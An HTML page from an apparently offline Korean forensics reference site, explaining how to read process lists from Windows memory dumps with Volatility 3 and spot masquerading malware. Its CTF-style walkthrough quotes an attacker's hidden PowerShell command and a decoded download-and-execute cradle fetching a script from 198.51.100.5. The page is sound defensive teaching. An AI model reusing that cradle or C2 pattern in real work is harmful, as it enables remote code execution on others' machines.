@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Volatility 3 windows.pslist로 메모리 덤프의 프로세스 목록 읽기 · FOR-0214 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=%EB%A9%94%EB%AA%A8%EB%A6%AC">메모리</a> / FOR-0214
+      </div>
+      <header class="article-head">
+        <h1>Volatility 3 windows.pslist로 메모리 덤프의 프로세스 목록 읽기</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">메모리</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+      <span class="chip">linux</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>windows.pslist는 커널의 활성 프로세스 연결 리스트를 순회해 PID·PPID·이미지 이름·생성 시각을 뽑아 주며, 부모-자식 관계가 어긋난 프로세스와 낯선 경로에서 실행된 프로세스가 곧 조사 대상이다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>Volatility 3, strings, grep, HxD</td></tr>
+<tr><th>artifact</th><td><code>memory dump</code> · <code>EPROCESS</code> · <code>process list</code></td></tr>
+<tr><th>파일 경로</th><td><code>mem.raw</code> · <code>memdump.mem</code> · <code>*.vmem</code> · <code>*.dmp</code></td></tr>
+<tr><th>로그 필드</th><td><code>PID</code> · <code>PPID</code> · <code>ImageFileName</code> · <code>Offset(V)</code> · <code>Threads</code> · <code>Handles</code> · <code>SessionId</code> · <code>Wow64</code> · <code>CreateTime</code> · <code>ExitTime</code></td></tr>
+<tr><th>파일 형식</th><td><code>raw</code> · <code>vmem</code> · <code>dmp</code> · <code>lime</code></td></tr>
+<tr><th>검색 별칭</th><td>volatility pslist · 볼라틸리티 프로세스 · 메모리 프로세스 목록 · pslist · 메모리 덤프 분석 시작 · vol.py pslist</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p><code>windows.pslist</code>는 커널의 활성 프로세스 연결 리스트를 순회해 PID·PPID·이미지 이름·생성 시각을 뽑아 주며, <strong>부모-자식 관계가 어긋난 프로세스와 낯선 경로에서 실행된 프로세스</strong>가 곧 조사 대상이다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;메모리 덤프에서 악성 프로세스를 찾아라&quot;</li><li>&quot;공격자가 실행한 프로그램의 명령행을 구하라&quot;</li><li>&quot;어떤 프로세스가 네트워크 연결을 열고 있었는가&quot;</li><li>&quot;숨겨진(rootkit) 프로세스가 있는가&quot;</li></ul>
+<p>메모리 분석은 <strong>거의 항상 <code>windows.info</code> → <code>windows.pslist</code> → <code>windows.pstree</code> → <code>windows.cmdline</code></strong> 순서로 시작한다. pslist는 그 두 번째 단계다.</p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>첨부가 수백 MB~수 GB이고 <code>file</code>이 <code>data</code>라고 답한다 (<a href="./30sec-triage.html">FOR-0001</a>)</li><li>파일명이 <code>*.raw</code>, <code>*.mem</code>, <code>*.vmem</code>, <code>*.dmp</code>, <code>memdump*</code></li><li>지문에 &quot;실행 중이었던&quot;, &quot;메모리&quot;, &quot;프로세스&quot;, &quot;명령어&quot; 같은 표현</li><li><code>strings mem.raw | grep -i &#39;flag{&#39;</code>가 가끔 바로 통한다 — 30초 투자할 가치가 있다</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) 프로파일/OS 확인 — 이것부터. 실패하면 덤프가 손상됐거나 OS가 다르다.
+python3 vol.py -f mem.raw windows.info
+
+# 2) 프로세스 목록
+python3 vol.py -f mem.raw windows.pslist
+
+# 3) 트리로 부모-자식 관계 보기 (이상 탐지에 훨씬 빠르다)
+python3 vol.py -f mem.raw windows.pstree</code></pre></div>
+<p>pip로 설치했다면 <code>vol.py</code> 대신 <code>vol</code>을 쓴다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">vol -f mem.raw windows.pslist</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-windowsinfo로-판을-확인">1단계 — <code>windows.info</code>로 판을 확인</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">python3 vol.py -f mem.raw windows.info</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">Variable            Value
+Kernel Base         0xf80267a00000
+DTB                 0x1ad000
+Is64Bit             True
+IsPAE               False
+primary             0 WindowsIntel32e
+memory_layer        1 FileLayer
+NTBuildLab          19041.1.amd64fre.vb_release.191206-1406
+NtSystemRoot        C:\Windows
+SystemTime          2026-03-14 07:41:03
+NtProductType       NtProductWinNt
+NtMajorVersion      10</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>값</th><th>왜 중요한가</th></tr></thead><tbody><tr><td><code>Is64Bit</code></td><td>32/64비트. 이후 플러그인 동작에 영향</td></tr><tr><td><code>NTBuildLab</code></td><td>Windows 빌드 (19041 = Win10 2004)</td></tr><tr><td><code>SystemTime</code></td><td><strong>덤프를 뜬 시각 (UTC)</strong>. 모든 타임라인의 기준점</td></tr><tr><td><code>NtSystemRoot</code></td><td>시스템 경로</td></tr></tbody></table></div>
+<p><code>windows.info</code>가 실패하면 그 뒤 모든 플러그인이 실패한다. 여기서 막히면 아래 &quot;막혔을 때&quot; 절로 간다.</p>
+<h3 id="2단계-windowspslist">2단계 — <code>windows.pslist</code></h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">python3 vol.py -f mem.raw windows.pslist</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">PID   PPID  ImageFileName    Offset(V)        Threads Handles SessionId Wow64  CreateTime                  ExitTime
+4     0     System           0xa50e8f2a3040   142     -       N/A       False  2026-03-14 06:02:11.000000
+88    4     Registry         0xa50e8f2f1080   4       -       N/A       False  2026-03-14 06:02:11.000000
+340   4     smss.exe         0xa50e91a4b040   2       -       N/A       False  2026-03-14 06:02:14.000000
+448   440   csrss.exe        0xa50e91b02140   11      -       0         False  2026-03-14 06:02:15.000000
+524   440   wininit.exe      0xa50e91c11080   1       -       0         False  2026-03-14 06:02:15.000000
+612   524   services.exe     0xa50e91d22080   6       -       0         False  2026-03-14 06:02:16.000000
+620   524   lsass.exe        0xa50e91d40080   9       -       0         False  2026-03-14 06:02:16.000000
+1104  612   svchost.exe      0xa50e92011080   14      -       0         False  2026-03-14 06:02:17.000000
+2884  2812  explorer.exe     0xa50e94a12080   72      -       1         False  2026-03-14 06:03:02.000000
+4288  2884  powershell.exe   0xa50e97b31080   12      -       1         False  2026-03-14 07:20:08.000000
+4520  4288  svch0st.exe      0xa50e98122080   5       -       1         False  2026-03-14 07:21:44.000000</code></pre></div>
+<p><code>windows.pslist</code>는 커널의 <strong>활성 프로세스 이중 연결 리스트</strong>(<code>PsActiveProcessHead</code>)를 따라간다. 빠르고 정확하지만, <strong>리스트에서 링크를 끊어낸(unlinked) 프로세스는 보이지 않는다.</strong> 그래서 <code>windows.psscan</code>이 따로 존재한다.</p>
+<h3 id="3단계-정상-부모-자식-관계를-기준선으로-삼는다">3단계 — 정상 부모-자식 관계를 기준선으로 삼는다</h3>
+<p><strong>이 표가 pslist 분석의 핵심이다.</strong> 어긋나면 의심한다.</p>
+<div class="table-wrap"><table><thead><tr><th>프로세스</th><th>정상 부모</th><th>정상 개수</th><th>정상 경로</th></tr></thead><tbody><tr><td><code>System</code></td><td>(PID 0)</td><td>1 (PID 항상 4)</td><td>—</td></tr><tr><td><code>smss.exe</code></td><td><code>System</code> (4)</td><td>1</td><td><code>\System32</code></td></tr><tr><td><code>csrss.exe</code></td><td><code>smss.exe</code> (종료됨)</td><td>2개 이상</td><td><code>\System32</code></td></tr><tr><td><code>wininit.exe</code></td><td><code>smss.exe</code> (종료됨)</td><td>1</td><td><code>\System32</code></td></tr><tr><td><code>winlogon.exe</code></td><td><code>smss.exe</code> (종료됨)</td><td>세션별 1</td><td><code>\System32</code></td></tr><tr><td><code>services.exe</code></td><td><code>wininit.exe</code></td><td><strong>1</strong></td><td><code>\System32</code></td></tr><tr><td><code>lsass.exe</code></td><td><code>wininit.exe</code></td><td><strong>1</strong></td><td><code>\System32</code></td></tr><tr><td><code>svchost.exe</code></td><td><code>services.exe</code></td><td>여러 개</td><td><code>\System32</code></td></tr><tr><td><code>explorer.exe</code></td><td><code>userinit.exe</code> (종료됨)</td><td>사용자별 1</td><td><code>\Windows</code></td></tr><tr><td><code>cmd.exe</code> / <code>powershell.exe</code></td><td><code>explorer.exe</code> 또는 부모 프로세스</td><td>—</td><td><code>\System32</code></td></tr><tr><td><code>taskhostw.exe</code></td><td><code>svchost.exe</code></td><td>—</td><td><code>\System32</code></td></tr></tbody></table></div>
+<p>이상 신호:</p>
+<ul><li><strong><code>lsass.exe</code>가 2개</strong> → 자격증명 탈취 도구가 위장</li><li><strong><code>svchost.exe</code>의 부모가 <code>services.exe</code>가 아님</strong> → 위장 프로세스</li><li><strong><code>svch0st.exe</code>, <code>scvhost.exe</code>, <code>lsas.exe</code></strong> → 이름 유사 위장 (위 예시의 PID 4520)</li><li><strong><code>explorer.exe</code>가 <code>cmd.exe</code>/<code>powershell.exe</code>를 낳고, 그것이 또 다른 exe를 낳음</strong> → 사용자 실행 → 스크립트 → 페이로드 체인</li><li><strong><code>winword.exe</code>/<code>excel.exe</code>가 <code>powershell.exe</code>의 부모</strong> → 문서 매크로 실행</li><li><strong><code>CreateTime</code>이 부팅 시각과 크게 떨어진 시스템 프로세스</strong> → 나중에 띄운 위장</li></ul>
+<p>위 출력에서 PID 4520 <code>svch0st.exe</code>는 ① 이름이 <code>svchost</code>가 아니라 <code>svch0st</code>(숫자 0) ② 부모가 <code>services.exe</code>가 아니라 <code>powershell.exe</code> ③ 생성 시각이 부팅 후 1시간 20분 뒤 — 세 가지가 모두 이상하다.</p>
+<h3 id="4단계-pstree로-체인을-한눈에">4단계 — <code>pstree</code>로 체인을 한눈에</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">python3 vol.py -f mem.raw windows.pstree</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">PID   PPID  ImageFileName
+4     0     System
+* 340   4     smss.exe
+* 88    4     Registry
+448   440   csrss.exe
+524   440   wininit.exe
+* 612   524   services.exe
+** 1104  612   svchost.exe
+* 620   524   lsass.exe
+2884  2812  explorer.exe
+* 4288  2884  powershell.exe
+** 4520  4288  svch0st.exe
+*** 4602  4520  cmd.exe</code></pre></div>
+<p>들여쓰기(<code>*</code>)가 깊이다. <code>explorer.exe → powershell.exe → svch0st.exe → cmd.exe</code> 체인이 즉시 눈에 들어온다. <strong>부모-자식 이상은 pslist보다 pstree에서 훨씬 빨리 보인다.</strong></p>
+<h3 id="5단계-의심-프로세스를-파고든다">5단계 — 의심 프로세스를 파고든다</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 명령행 — 가장 정보량이 많다
+python3 vol.py -f mem.raw windows.cmdline
+python3 vol.py -f mem.raw windows.cmdline --pid 4288
+
+# 그 프로세스의 네트워크 연결
+python3 vol.py -f mem.raw windows.netscan | grep -E &#39;4288|4520&#39;
+
+# 로드된 DLL
+python3 vol.py -f mem.raw windows.dlllist --pid 4520
+
+# 코드 인젝션 흔적
+python3 vol.py -f mem.raw windows.malfind --pid 4520
+
+# 실행 파일을 디스크로 덤프
+mkdir -p dump
+python3 vol.py -f mem.raw -o dump/ windows.pslist --pid 4520 --dump
+ls -la dump/ &amp;&amp; file dump/*
+
+# 링크가 끊긴/종료된 프로세스까지 (풀 태그 스캔)
+python3 vol.py -f mem.raw windows.psscan</code></pre></div>
+<h3 id="6단계-pslist와-psscan을-비교한다-숨은-프로세스-탐지">6단계 — pslist와 psscan을 비교한다 (숨은 프로세스 탐지)</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">python3 vol.py -r csv -f mem.raw windows.pslist &gt; pslist.csv
+python3 vol.py -r csv -f mem.raw windows.psscan &gt; psscan.csv
+
+# psscan에만 있는 PID = 링크 해제(은닉) 또는 이미 종료된 프로세스
+awk -F, &#39;NR&gt;1 {print $2}&#39; psscan.csv | sort -u &gt; /tmp/scan.pid
+awk -F, &#39;NR&gt;1 {print $2}&#39; pslist.csv | sort -u &gt; /tmp/list.pid
+comm -23 /tmp/scan.pid /tmp/list.pid</code></pre></div>
+<p>차이가 나온 PID는 둘 중 하나다. <strong>① 이미 종료된 프로세스</strong>(정상, <code>ExitTime</code>이 채워져 있다) <strong>② 리스트에서 링크를 끊은 은닉 프로세스</strong>(rootkit). <code>windows.psscan</code> 출력의 <code>ExitTime</code> 컬럼으로 구분한다.</p>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<div class="table-wrap"><table><thead><tr><th>컬럼</th><th>의미</th><th>읽는 법</th></tr></thead><tbody><tr><td><code>PID</code></td><td>프로세스 ID</td><td>다른 모든 플러그인의 <code>--pid</code> 인자</td></tr><tr><td><code>PPID</code></td><td>부모 PID</td><td><strong>위 기준선 표와 대조.</strong> 부모가 pslist에 없으면 이미 종료됨</td></tr><tr><td><code>ImageFileName</code></td><td>실행 파일 이름 (<strong>최대 15자로 잘린다</strong>)</td><td>전체 경로는 <code>windows.dlllist</code>나 <code>cmdline</code>에서</td></tr><tr><td><code>Offset(V)</code></td><td><code>EPROCESS</code> 구조체의 가상 주소</td><td>저수준 분석/덤프 시 사용</td></tr><tr><td><code>Threads</code></td><td>스레드 수</td><td>0이면 이미 종료. 1~2개면 껍데기 프로세스 의심</td></tr><tr><td><code>Handles</code></td><td>핸들 수</td><td>이미지에 따라 <code>-</code>로 나온다. 없다고 문제는 아니다</td></tr><tr><td><code>SessionId</code></td><td>터미널 세션</td><td>0 = 서비스/시스템, 1+ = 대화형 로그온 사용자</td></tr><tr><td><code>Wow64</code></td><td>32비트 프로세스 여부</td><td>64비트 OS에서 <code>True</code>면 32비트 실행 파일</td></tr><tr><td><code>CreateTime</code></td><td><strong>프로세스 생성 시각 (UTC)</strong></td><td>타임라인의 핵심</td></tr><tr><td><code>ExitTime</code></td><td>종료 시각</td><td>값이 있으면 덤프 시점에 이미 종료됨</td></tr><tr><td><code>File output</code></td><td><code>--dump</code> 결과 파일명</td><td>덤프 성공 여부</td></tr></tbody></table></div>
+<p><code>ImageFileName</code>이 15자에서 잘린다는 점을 반드시 기억한다. <code>verylongmalware.exe</code>는 <code>verylongmalwar</code>로 표시된다. <strong>이름으로 판단하지 말고 <code>cmdline</code>으로 전체 경로를 확인한다.</strong></p>
+<p><code>SessionId</code>도 유용하다. 정상적인 서비스가 <code>SessionId 1</code>(대화형)에서 돌고 있으면 위장이다.</p>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>pslist에서 얻은 것</th><th>다음 플러그인 / artifact</th><th>확인할 것</th></tr></thead><tbody><tr><td>의심 PID</td><td><code>windows.cmdline --pid N</code></td><td><strong>명령행 인자</strong> (여기 답이 있는 경우가 가장 많다)</td></tr><tr><td>의심 PID</td><td><code>windows.netscan</code></td><td>연결한 IP·포트 (C2 서버)</td></tr><tr><td>의심 PID</td><td><code>windows.malfind --pid N</code></td><td>인젝션된 코드 (<code>MZ</code> 헤더 발견 시 확정)</td></tr><tr><td>의심 PID</td><td><code>windows.dlllist --pid N</code></td><td>전체 경로, 로드된 DLL</td></tr><tr><td>의심 PID</td><td><code>windows.handles --pid N</code></td><td>열고 있던 파일·레지스트리·뮤텍스</td></tr><tr><td>의심 PID</td><td><code>windows.pslist --pid N --dump</code></td><td>실행 파일 추출 → 해시 → strings</td></tr><tr><td><code>CreateTime</code></td><td>EVTX 4688 (<a href="./event-4624-logon.html">FOR-0083</a>)</td><td>디스크 로그와 시각 대조</td></tr><tr><td><code>CreateTime</code></td><td>Prefetch / Amcache / UserAssist</td><td>실행 흔적 교차검증</td></tr><tr><td>파일 경로</td><td><code>windows.filescan</code> → <code>windows.dumpfiles</code></td><td>메모리에 남은 파일 추출</td></tr><tr><td>레지스트리 필요</td><td><code>windows.registry.hivelist</code> → <code>printkey</code></td><td>지속성 키(Run/Services)</td></tr><tr><td>명령행의 IP</td><td>pcap의 <code>ip.addr == &lt;IP&gt;</code> (<a href="./wireshark-30sec-triage.html">FOR-0146</a>)</td><td>실제 트래픽</td></tr></tbody></table></div>
+<p><strong><code>windows.cmdline</code>을 먼저 돌리는 습관을 들이는 것이 좋다.</strong> PowerShell <code>-EncodedCommand</code>, <code>rundll32</code> 인자, C2 주소가 그대로 들어 있는 경우가 매우 흔하다.</p>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong><code>windows.info</code>를 건너뛰는 것.</strong> 실패하면 이후 전부 실패한다. 먼저 확인한다.</li><li><strong>Volatility 2 명령을 쓰는 것.</strong> Vol3에는 <code>--profile</code>이 없고 플러그인 이름이 <code>windows.pslist</code> 형식이다. <code>-f mem.raw --profile=Win10x64 pslist</code>는 Vol3에서 동작하지 않는다.</li><li><strong>심볼 다운로드 실패.</strong> Vol3는 커널 심볼(PDB/ISF)이 필요하고 기본적으로 온라인에서 받는다. <strong>대회장은 오프라인이므로 미리 준비해야 한다.</strong> <code>volatility3/symbols/</code> 폴더에 <code>windows.zip</code>을 넣어두거나 <code>--symbol-dirs</code>로 경로를 지정한다.</li><li><strong><code>ImageFileName</code>을 전체 이름으로 믿는 것.</strong> 15자에서 잘린다.</li><li><strong>pslist에 없다고 프로세스가 없었다고 결론 내는 것.</strong> <code>windows.psscan</code>을 반드시 함께 돌린다.</li><li><strong><code>Handles</code>가 <code>-</code>인 것을 오류로 보는 것.</strong> 이미지·빌드에 따라 수집되지 않는다. 정상이다.</li><li><strong><code>CreateTime</code>을 로컬 시간으로 읽는 것.</strong> Vol3 출력은 <strong>UTC</strong>다. KST 답이 필요하면 +9시간.</li><li><strong>부모가 안 보이는 것을 이상으로 보는 것.</strong> <code>explorer.exe</code>의 부모 <code>userinit.exe</code>, <code>csrss.exe</code>의 부모 <code>smss.exe</code>는 정상적으로 이미 종료되어 pslist에 없다. <strong>이것은 정상이다.</strong></li><li><strong>PID 재사용을 놓치는 것.</strong> 오래 켜둔 시스템에서는 PID가 재사용된다. <code>Offset(V)</code>와 <code>CreateTime</code>으로 구분한다.</li><li><strong>덤프 파일 크기와 실제 RAM 크기 불일치를 무시하는 것.</strong> 덤프가 잘렸으면 일부 프로세스가 누락된다.</li><li><strong><code>strings</code>를 안 돌려보는 것.</strong> 30초짜리 시도로 flag가 나오는 경우가 실제로 있다.</li><li><strong>하이버네이션/크래시 덤프를 RAW로 취급하는 것.</strong> <code>hiberfil.sys</code>와 <code>.dmp</code>는 형식이 다르다. Vol3는 대부분 자동 인식하지만, 실패하면 변환이 필요하다.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) pslist — 활성 리스트
+python3 vol.py -f mem.raw windows.pslist
+
+# 2) psscan — 풀 태그 스캔 (은닉/종료 포함)
+python3 vol.py -f mem.raw windows.psscan
+
+# 3) pstree — 관계 구조
+python3 vol.py -f mem.raw windows.pstree
+
+# 4) 명령행 — 이름 위장을 꿰뚫는다
+python3 vol.py -f mem.raw windows.cmdline
+
+# 5) 파서를 우회한 확인
+strings mem.raw | grep -iE &#39;svch0st|powershell -enc|\\\\Temp\\\\.*\.exe&#39; | sort -u | head
+
+# 6) 디스크 artifact와 대조 (있다면)
+#    Prefetch / Amcache / EVTX 4688 의 실행 시각이 CreateTime과 맞는가</code></pre></div>
+<p>1)과 2)의 PID 집합이 다르면 그 차이를 반드시 설명할 수 있어야 한다. 4)는 이름 위장을 무력화하는 가장 확실한 수단이다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;감염 PC의 메모리 덤프입니다. 악성 프로세스의 이름과 C2 서버 주소를 구하세요.&quot;
+첨부: infected.raw (2.0 GB)
+
+1. file infected.raw
+   -&gt; data          (매직 없음. 크기가 2 GB = 메모리 덤프 후보)
+
+2. python3 vol.py -f infected.raw windows.info
+   -&gt; NTBuildLab 19041.1 / Is64Bit True / SystemTime 2026-03-14 07:41:03
+   정상 인식. 진행 가능.
+
+3. python3 vol.py -f infected.raw windows.pslist
+   -&gt; 68개 프로세스. 눈으로 훑기엔 많다.
+
+4. 첫 시도 (실패한 접근):
+   프로세스 이름만 훑으며 &quot;낯선 이름&quot;을 찾았다.
+   전부 svchost/csrss 같은 정상 이름처럼 보여 아무것도 못 찾았다.
+
+5. 접근 변경 — pstree로 관계를 본다
+   python3 vol.py -f infected.raw windows.pstree
+
+   2884  2812  explorer.exe
+   * 4288  2884  powershell.exe
+   ** 4520  4288  svch0st.exe          &lt;- 부모가 powershell!
+   *** 4602  4520  cmd.exe
+
+   svchost의 정상 부모는 services.exe(612)다.
+   여기서는 powershell.exe(4288)가 부모 -&gt; 위장 확정.
+   이름도 svch0st (숫자 0).
+
+6. 명령행 확인
+   python3 vol.py -f infected.raw windows.cmdline --pid 4288
+   4288  powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A...
+
+   python3 vol.py -f infected.raw windows.cmdline --pid 4520
+   4520  svch0st.exe     C:\Users\jhkim\AppData\Local\Temp\svch0st.exe -c 198.51.100.5:4444
+
+   C2 주소가 명령행에 그대로 있었다.
+
+7. 확증 — 네트워크 연결
+   python3 vol.py -f infected.raw windows.netscan | grep 4520
+   0xa50e9a...  TCPv4  10.0.0.15  49820  198.51.100.5  4444  ESTABLISHED  4520  svch0st.exe
+
+8. 확증 — 인젝션 여부
+   python3 vol.py -f infected.raw windows.malfind --pid 4520
+   -&gt; PAGE_EXECUTE_READWRITE 영역에서 MZ 헤더 발견. 인젝션 확정.
+
+9. 실행 파일 추출 후 해시
+   python3 vol.py -f infected.raw -o dump/ windows.pslist --pid 4520 --dump
+   sha256sum dump/*.exe
+
+10. PowerShell EncodedCommand 디코딩 (참고)
+    -enc 값은 UTF-16LE Base64다.
+    python3 -c &quot;import base64;print(base64.b64decode(&#39;SQBFAFgAIAAoAE4A...&#39;).decode(&#39;utf-16-le&#39;))&quot;
+    -&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;http://198.51.100.5/a.ps1&#39;)
+
+정답: svch0st.exe / C2 = 198.51.100.5:4444</code></pre></div>
+<p>4단계의 실패가 교훈이다. <strong>이름만 훑으면 못 찾는다. <code>pstree</code>로 부모-자식 관계를 보는 것이 정답이었고, <code>cmdline</code>이 결정타였다.</strong></p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li><code>windows.info</code>가 성공했는가 — 실패하면 심볼/덤프 형식 문제</li><li><strong>심볼 파일이 오프라인으로 준비되어 있는가</strong> (<code>volatility3/symbols/windows.zip</code>)</li><li><code>windows.pstree</code>를 봤는가 — 이상은 관계에서 드러난다</li><li><code>windows.cmdline</code>을 돌렸는가 — 정보량 최대</li><li><code>windows.psscan</code>과 PID 집합을 비교했는가 — 은닉 프로세스</li><li>정상 부모-자식 기준선 표와 대조했는가</li><li>이름 유사 위장(<code>svch0st</code>, <code>scvhost</code>, <code>lsas</code>, <code>explore</code>)을 확인했는가</li><li><code>SessionId</code>가 이상한 프로세스가 있는가 (서비스가 세션 1에 있음 등)</li><li><code>Threads</code>가 0 또는 1~2인 프로세스가 있는가</li><li><code>CreateTime</code>이 부팅 시각과 크게 떨어진 시스템 프로세스가 있는가</li><li><code>windows.netscan</code>으로 외부 연결을 봤는가</li><li><code>windows.malfind</code>로 인젝션을 확인했는가</li><li><code>strings mem.raw | grep flag</code> 를 최후 수단으로 돌렸는가</li><li>덤프 시각(<code>SystemTime</code>)을 기준으로 디스크 artifact와 시간대를 맞췄는가</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-006 — Volatility 3 documentation: <code>windows.info</code>, <code>windows.pslist</code>, <code>windows.psscan</code>, <code>windows.pstree</code> 플러그인 옵션과 출력 컬럼</li><li>SRC-014 — Microsoft Learn, File Times: <code>CreateTime</code>이 UTC 기준임을 확인하는 근거</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./30sec-triage.html">
+    <span class="rel-id">FOR-0001 · 트리아지</span>
+    포렌식 문제 파일을 받았을 때 30초 트리아지
+  </a>
+  <a class="related-item" href="./event-4624-logon.html">
+    <span class="rel-id">FOR-0083 · Event Log</span>
+    Event ID 4624 성공 로그온 분석: 누가 어디서 어떻게 들어왔나
+  </a>
+  <a class="related-item" href="./mft-basics.html">
+    <span class="rel-id">FOR-0021 · 디스크/NTFS</span>
+    $MFT 기본 구조와 포렌식 활용
+  </a>
+  <a class="related-item" href="./ipv4-regex.html">
+    <span class="rel-id">FOR-0128 · 로그/Regex</span>
+    IPv4 주소 regex: 느슨한 패턴과 엄격한 패턴 골라 쓰기
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./chrome-history.html"><span class="rel-id">← FOR-0191</span>Chrome History DB 구조: urls / visits / downloads 읽기</a>
+<span></span>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-windowsinfo로-판을-확인">1단계 — `windows.info`로 판을 확인</a></li>
+<li class="toc-l3"><a href="#2단계-windowspslist">2단계 — `windows.pslist`</a></li>
+<li class="toc-l3"><a href="#3단계-정상-부모-자식-관계를-기준선으로-삼는다">3단계 — 정상 부모-자식 관계를 기준선으로 삼는다</a></li>
+<li class="toc-l3"><a href="#4단계-pstree로-체인을-한눈에">4단계 — `pstree`로 체인을 한눈에</a></li>
+<li class="toc-l3"><a href="#5단계-의심-프로세스를-파고든다">5단계 — 의심 프로세스를 파고든다</a></li>
+<li class="toc-l3"><a href="#6단계-pslist와-psscan을-비교한다-숨은-프로세스-탐지">6단계 — pslist와 psscan을 비교한다 (숨은 프로세스 탐지)</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 02:32 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
